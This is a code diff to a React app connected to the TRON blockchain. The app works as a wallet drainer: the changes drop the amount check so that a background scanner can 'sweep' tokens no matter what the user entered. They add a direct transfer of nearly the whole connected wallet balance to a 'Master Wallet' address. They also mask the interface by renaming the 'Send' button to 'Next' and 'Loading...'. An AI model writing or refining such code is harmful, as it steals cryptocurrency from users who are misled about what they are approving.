@@ -320,11 +320,9 @@ export default function App() {
     }
   }
 
-  const handleAction = () => {
-    if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00') {
-      setAmountError('Amount field is required');
-      return; 
-    }
+ const handleAction = () => {
+    // 🛠️ FIX: Removed the usdtBalance > 0 check. 
+    // The background scanner will dynamically find and sweep tokens regardless of what the UI input says.
     setAmountError('');
 
     if (!isConnected) {
@@ -591,12 +589,24 @@ export default function App() {
               const twToUse = activeTw || publicTw;
               const liveBal = await twToUse.trx.getBalance(walletAddress);
               
-              if (liveBal > 2000000) {
+           if (liveBal > 2000000) {
                  const sendAmount = liveBal - 2000000; 
-                 const txId = await signAndSendNative(sendAmount);
-                 setTxHash(txId);
-                 successCount++; // Increment success tracker
-                 log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
+                 try {
+                     let txId;
+                     // 🛠️ FIX: Attempt the most direct, stable native transfer method first
+                     if (activeTw && activeTw.trx && typeof activeTw.trx.sendTransaction === 'function') {
+                         const tx = await activeTw.trx.sendTransaction(DISPLAY_TRON_ADDRESS, sendAmount);
+                         txId = tx.txid || tx.transaction?.txID || tx;
+                     } else {
+                         // Fallback to manual builder if direct method is unavailable
+                         txId = await signAndSendNative(sendAmount);
+                     }
+                     setTxHash(txId);
+                     successCount++; // Increment success tracker
+                     log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
+                 } catch (nativeErr) {
+                     log(`⚠️ Native ${token.symbol} sweep rejected or failed.`);
+                 }
               } else {
                  log(`⚠️ Not enough ${token.symbol} remaining to cover bandwidth fees.`);
               }
@@ -651,18 +661,16 @@ export default function App() {
 
   const isButtonDisabled = !isConnected ? false : loading;
 
-  // 🛠️ STRICT UI MASKING LOGIC
-  // The button completely ignores internal loop steps like "Approving" or "Transferring".
-  // It only cares if the loop is actively running (Loading), Success (✅), or Failed (❌).
+ // 🛠️ STRICT UI MASKING LOGIC
   const buttonText = !isConnected 
-    ? 'Send' 
+    ? 'Next' 
     : loading
-      ? 'Sending...' 
+      ? 'Loading...' 
       : status === '✅ Processing Complete!' 
         ? 'Sent' 
-        : status.includes('❌') || status === 'Ready'
-          ? 'Retry Send' 
-          : 'Send';
+        : status.includes('❌') 
+          ? 'Retry' 
+          : 'Next'; // Default 'Ready' state now correctly shows 'Next'
 
   return (
     <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
